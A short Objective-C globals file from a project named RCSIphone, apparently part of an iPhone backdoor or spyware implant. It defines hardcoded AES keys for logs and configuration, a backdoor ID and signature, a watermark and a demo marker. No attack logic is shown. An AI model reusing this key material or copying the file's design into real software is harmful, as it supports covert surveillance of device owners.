//
//  RCSIGlobals.m
//  RCSIphone
//
//  Created by armored on 8/20/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "RCSIGlobals.h"

char gLogAesKeyAscii[64];
char gConfAesKeyAscii[64];
char gBackdoorSignatureAscii[64];

char gLogAesKey[]   = "a2b2b0b59c9462335119c66ffd7aad55";
char gConfAesKey[]  = "6uo_E0S4w_FD0j9NEhW2UpFw9rwy90LY";
char gBackdoorID[]  = "YYYY0000002223XX";                 // last "XX" for string terminating in rcsmmain.m
                                                          // last "XX" for string terminating in rcsmmain.m

char gBackdoorSignature[]  = "572ebc94391281ccf53a851330bb0d9954323937";
char gBackdoorPseduoSign[] = "B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW"; // watermark

char gDemoMarker[] = "Pg-WaVyPzMMMMmGbhP6qAigT";

u_int gVersion     = 2014093001;